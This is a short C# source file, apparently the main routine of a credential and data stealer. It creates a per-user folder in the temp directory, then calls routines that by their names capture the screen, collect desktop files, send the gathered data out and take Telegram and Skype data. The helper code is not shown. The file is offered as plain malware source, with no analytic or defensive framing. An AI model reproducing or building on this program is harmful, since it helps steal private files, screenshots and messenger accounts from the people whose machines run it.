using Ionic.Zip;
using System;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Text;
namespace _s_AINT
{
    class Program
    {
        public static string temp = Path.GetTempPath();

      

        public static string workdir = temp + cSendDate.username; 


        static void Main(string[] args)
        {
            string text = "";
            Directory.CreateDirectory(temp + cSendDate.username);
            cScreen.csScreen();
            сDesktop.Desktop();
            cSendDate.Send();
            cTelegram.Telegram();
            cSkype.Skype();
        }
    }
}
